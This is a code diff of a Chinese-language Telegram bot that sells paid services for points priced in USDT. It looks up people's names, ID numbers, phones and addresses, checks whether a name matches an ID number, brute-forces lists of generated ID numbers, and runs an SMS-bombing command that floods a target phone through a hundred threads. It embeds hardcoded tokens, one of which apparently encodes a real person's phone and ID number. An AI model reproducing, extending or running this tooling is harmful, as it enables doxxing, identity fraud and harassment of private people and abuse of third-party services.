@@ -11,7 +11,7 @@ import random
 import concurrent.futures
 import inspect  
 import sms_list 
-from sms_list import * 
+from sms_list import *
 from Crypto.Cipher import DES3
 from datetime import datetime
 from telebot import types
@@ -25,7 +25,6 @@ POINTS_FILE = 'points.json'
 TOKEN_FILE = 'token.txt'
 DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 
 
-# 这里的 AUTH_BEARER 建议定期检查是否失效
 AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"
 
 bot = telebot.TeleBot(API_TOKEN)
@@ -102,19 +101,12 @@ def hb_search_logic(chat_id, search_value, uid):
             if "error" in result_data:
                 bot.send_message(chat_id, result_data["error"])
             elif "page" in result_data and result_data["page"]:
-                # --- 修改点：hb查询积分改为 3.5 ---
                 user_points[uid] -= 3.5
                 save_points()
-
                 result_message = "✅查询结果:\n"
                 for item in result_data["page"]:
-                    result_message += f"姓名:{item['resName']}\n"
-                    result_message += f"证件:{item['sfcode']}\n"
-                    result_message += f"手机:{item['mobile']}\n"
-                    result_message += f"地址:{item['address']}\n\n"
-                
-                result_message += f"已扣除 **3.5** 积分！\n"
-                result_message += f"当前积分余额：**{user_points[uid]:.2f}** 积分"
+                    result_message += f"姓名:{item['resName']}\n证件:{item['sfcode']}\n手机:{item['mobile']}\n地址:{item['address']}\n\n"
+                result_message += f"已扣除 **3.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分"
                 bot.send_message(chat_id, result_message.strip(), parse_mode='Markdown')
             else:
                 bot.send_message(chat_id, "查询为空")
@@ -155,14 +147,7 @@ def get_main_text(source, uid, pts):
     first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
     username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
     return (
-        f"Admin@铭\n\n"
-        f"用户 ID: `{uid}`\n"
-        f"用户名称: `{first_name}`\n"
-        f"用户名: {username}\n"
-        f"当前余额: `{pts:.2f}积分`\n\n"
-        f"使用帮助可查看使用教程\n"
-        f"在线充值可支持24小时\n"
-        f"1 USDT = 1 积分"
+        f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分"
     )
 
 def get_ui_bar(done, total):
@@ -176,32 +161,32 @@ def get_ui_bar(done, total):
 
 def single_verify_2ys(chat_id, name, id_card, uid):
     url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
-    headers = {
-        "Authorization": AUTH_BEARER,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X)",
-        "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"
-    }
+    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"}
     try:
         r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
         user_points[uid] -= 0.5
         save_points()
-        if r.status_code == 200 and r.json().get("success"):
-            res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **二要素核验一致✅**\n\n"
-                   f"已扣除 **0.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分")
-        else:
-            res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **二要素验证失败❌**\n\n"
-                   f"已扣除 **0.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分")
-    except: 
-        res = "❌ 接口请求失败"
+        res_type = "二要素核验一致✅" if r.json().get("success") else "二要素验证失败❌"
+        res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
+    except: res = "❌ 接口请求失败"
     bot.send_message(chat_id, res, parse_mode='Markdown')
+
+# --- 逻辑接入：三要素核验功能 ---
+def qingfeng_3ys_verify(chat_id, name, id_card, phone, uid):
+    url = f"https://qingfeng.qzz.io/api/free/heyan/sys1?xm={name}&sfz={id_card}&sjh={phone}"
+    try:
+        r = requests.get(url, timeout=15)
+        user_points[uid] -= 1.0; save_points()
+        res = (f"📑 **三要素核验结果**\n\n👤 姓名: `{name}`\n🆔 证件: `{id_card}`\n📱 手机: `{phone}`\n📡 响应: `{r.text[:300]}`\n\n"
+               f"已扣除 **1.0** 积分！\n当前余额: **{user_points[uid]:.2f}**")
+        bot.send_message(chat_id, res, parse_mode='Markdown')
+    except: bot.send_message(chat_id, "❌ 三要素接口请求失败")
 
 def run_batch_task(chat_id, msg_id, name, id_list, uid):
     headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
     total, done = len(id_list), 0
     success_match, is_running = None, True
     lock = threading.Lock()
-
     def progress_monitor():
         nonlocal done, is_running
         while is_running:
@@ -210,7 +195,6 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
             try: bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(current_done, total))
             except: pass
     threading.Thread(target=progress_monitor, daemon=True).start()
-
     def verify(id_no):
         nonlocal done, success_match, is_running
         if not is_running: return
@@ -221,100 +205,78 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
                 with lock:
                     if is_running:
                         user_points[uid] -= 2.5; save_points()
-                        success_match = (f"✅ **核验成功！**\n\n**{name} {id_no}** 二要素核验一致✅\n\n"
-                                        f"已扣除 **2.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分")
+                        success_match = (f"✅ **核验成功！**\n\n**{name} {id_no}** 二要素一致\n\n已扣除 **2.5** 积分！\n当前余额：**{user_points[uid]:.2f}**")
                         is_running = False
         except: pass
         finally:
             with lock: done += 1
-    with ThreadPoolExecutor(max_workers=10) as ex:
-        ex.map(verify, id_list)
+    with ThreadPoolExecutor(max_workers=10) as ex: ex.map(verify, id_list)
     is_running = False
     try: bot.delete_message(chat_id, msg_id)
     except: pass
     bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')
 
-# ================= 5. 核心：接口全量加载器 =================
+# ================= 5. 短信轰炸 (保持原样) =================
 
 def get_all_senders():
-    """✨ 全自动扫描：动态加载 sms_list 中所有的接口函数"""
     all_funcs = []
-    # 辅助工具和非接口函数排除名单
     excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
-    
-    # 扫描模块中的所有函数
     for name, obj in inspect.getmembers(sms_list):
         if inspect.isfunction(obj) and name not in excludes:
             try:
-                # 自动核验该函数是否支持接收一个手机号参数
                 sig = inspect.signature(obj)
-                if len(sig.parameters) >= 1:
-                    all_funcs.append(obj)
-            except:
-                pass
+                if len(sig.parameters) >= 1: all_funcs.append(obj)
+            except: pass
     return all_funcs
 
 @bot.message_handler(commands=['sms'])
 def sms_bomb_cmd(message):
     uid = message.from_user.id
-    if user_points.get(uid, 0.0) < 5.5: return bot.reply_to(message, "积分不足，轰炸需 5.5 积分！")
-    
+    if user_points.get(uid, 0.0) < 5.5: return bot.reply_to(message, "积分不足(5.5)")
     parts = message.text.split()
-    if len(parts) < 2: return bot.reply_to(message, "使用方法: `/sms 手机号`", parse_mode='Markdown')
-    
+    if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
     target = parts[1]
     if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
-    
-    # 实时获取合并后的最新接口列表
     all_funcs = get_all_senders()
-    bot.reply_to(message, f"🎯 **接口装载成功：{len(all_funcs)}个**\n正在对 `{target}` 发起全面轰炸...", parse_mode='Markdown')
-    
+    bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
     user_points[uid] -= 5.5; save_points()
-
     def do_bomb():
         random.shuffle(all_funcs)
-        # 并发效率配置
         with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
-            for func in all_funcs:
-                executor.submit(func, target)
+            for func in all_funcs: executor.submit(func, target)
         bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
-    
     threading.Thread(target=do_bomb).start()
 
 # ================= 6. 管理与业务指令 =================
 
+@bot.message_handler(commands=['3ys'])
+def cmd_3ys_manual(message):
+    if user_points.get(message.from_user.id, 0.0) < 1.0: return bot.reply_to(message, "积分不足(1.0)")
+    bot.send_message(message.chat.id, "请输入：**姓名 身份证 手机号**", parse_mode='Markdown')
+
 @bot.message_handler(commands=['hb'])
 def hb_cmd(message):
-    # --- 修改点：hb查询门槛改为 3.5 ---
-    if user_points.get(message.from_user.id, 0.0) < 3.5: return bot.reply_to(message, "积分不足，请先充值！")
+    if user_points.get(message.from_user.id, 0.0) < 3.5: return bot.reply_to(message, "积分不足！")
     bot.send_message(message.chat.id, "请输入身份证号或手机号进行查询")
 
 @bot.message_handler(commands=['admin'])
 def admin_cmd(message):
-    if message.from_user.id != ADMIN_ID: 
-        bot.reply_to(message, "🤡你没有权限使用该指令…")
-        return
-    bot.send_message(message.chat.id, "👑 **管理员控制台**\n\n`/add 用户ID 分数` (充值)\n`/set_token` (更换批量Token)", parse_mode='Markdown')
+    if message.from_user.id != ADMIN_ID: return
+    bot.send_message(message.chat.id, "👑 **管理员控制台**\n\n`/add ID 分数`\n`/set_token`", parse_mode='Markdown')
 
 @bot.message_handler(commands=['add'])
 def add_points_cmd(message):
-    if message.from_user.id != ADMIN_ID: 
-        bot.reply_to(message, "🤡你没有权限使用该指令…")
-        return
+    if message.from_user.id != ADMIN_ID: return
     try:
-        parts = message.text.split()
-        if len(parts) != 3: raise ValueError
-        tid, amt = int(parts[1]), float(parts[2])
-        user_points[tid] = user_points.get(tid, 0.0) + amt
-        save_points()
-        bot.reply_to(message, f"✅ 已充值！\n用户 ID: `{tid}`\n当前余额: `{user_points[tid]:.2f}`")
+        p = message.text.split()
+        tid, amt = int(p[1]), float(p[2])
+        user_points[tid] = user_points.get(tid, 0.0) + amt; save_points()
+        bot.reply_to(message, f"✅ 已充值！当前余额: `{user_points[tid]:.2f}`")
     except: pass
 
 @bot.message_handler(commands=['set_token'])
 def set_token_cmd(message):
-    if message.from_user.id != ADMIN_ID: 
-        bot.reply_to(message, "🤡你没有权限使用该指令…")
-        return
+    if message.from_user.id != ADMIN_ID: return
     msg = bot.reply_to(message, "请输入X-Token：")
     bot.register_next_step_handler(msg, lambda m: [save_token(m.text.strip()), bot.send_message(m.chat.id, "✅ Token已更新")])
 
@@ -326,19 +288,19 @@ def start_cmd(message):
 
 @bot.message_handler(commands=['pl'])
 def pl_cmd(message):
-    if user_points.get(message.from_user.id, 0.0) < 2.5: return bot.reply_to(message, "积分不足，请先充值！")
+    if user_points.get(message.from_user.id, 0.0) < 2.5: return bot.reply_to(message, "积分不足！")
     user_states[message.chat.id] = {'step': 'v_name'}
     bot.send_message(message.chat.id, "请输入姓名：")
 
 @bot.message_handler(commands=['bq'])
 def bq_cmd(message):
-    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足，请先充值！")
+    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
     user_states[message.chat.id] = {'step': 'g_card'}
     bot.send_message(message.chat.id, "请输入身份证号（未知用x）：")
 
 @bot.message_handler(commands=['2ys'])
-def cmd_2ys(message):
-    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足，请先充值！")
+def cmd_2ys_cmd(message):
+    if user_points.get(message.from_user.id, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
     bot.send_message(message.chat.id, "请输入**姓名 身份证号**", parse_mode='Markdown')
 
 @bot.message_handler(func=lambda m: True)
@@ -346,22 +308,26 @@ def handle_all(message):
     uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
     if text.startswith('/'): return 
     
+    # 逻辑接入：三要素自动识别识别
+    match_3ys = re.match(r'^([\u4e00-\u9fa5]{2,4})\s+(\d{17}[\dXx])\s+(1[3-9]\d{9})$', text)
+    if match_3ys:
+        if user_points.get(uid, 0.0) < 1.0: return bot.reply_to(message, "积分不足(1.0)")
+        return qingfeng_3ys_verify(chat_id, *match_3ys.groups(), uid)
+
     if re.match(r'^1[3-9]\d{9}$', text) or re.match(r'^\d{17}[\dXx]$', text):
-        # --- 修改点：hb查询判定积分改为 3.5 ---
-        if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足，请先充值！")
+        if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
         return hb_search_logic(chat_id, text, uid)
 
     match_2ys = re.match(r'^([\u4e00-\u9fa5]{2,4})\s+(\d{17}[\dXx])$', text)
     if match_2ys:
-        if user_points.get(uid, 0.0) < 0.5: return bot.reply_to(message, "积分不足，请先充值！")
+        if user_points.get(uid, 0.0) < 0.5: return bot.reply_to(message, "积分不足(0.5)")
         return single_verify_2ys(chat_id, *match_2ys.groups(), uid)
     
     state = user_states.get(chat_id)
     if not state: return
-
     if state['step'] == 'v_name':
         user_states[chat_id].update({'step': 'v_ids', 'name': text})
-        bot.send_message(chat_id, f"✅ 记录姓名：{text}\n请发送身份证列表：")
+        bot.send_message(chat_id, f"✅ 姓名：{text}\n请发送身份证列表：")
     elif state['step'] == 'v_ids':
         ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if len(i)==18]
         if ids:
@@ -381,7 +347,7 @@ def handle_all(message):
         generated_cache[uid] = ids
         with open("铭.txt", "w", encoding="utf-8") as f: f.write("\n".join(ids))
         markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("立即核验 (2.5积分)", callback_data="start_verify_flow"))
-        with open("铭.txt", "rb") as f: bot.send_document(chat_id, f, caption=f"✅ 生成成功！共 {len(ids)} 个", reply_markup=markup)
+        with open("铭.txt", "rb") as f: bot.send_document(chat_id, f, caption=f"✅ 生成成功！", reply_markup=markup)
         del user_states[chat_id]
     elif state['step'] == 'v_name_after_gen':
         if uid in generated_cache:
@@ -393,7 +359,7 @@ def handle_all(message):
 def handle_callback(call):
     uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
     if call.data == "view_help":
-        # --- 修改点：帮助菜单里的 hb 提示改为 3.5 ---
+        # ================= 改回为你原来的使用帮助排版 =================
         help_text = (
             "🛠️️使用帮助\n"
             "短信测试 (新)\n"
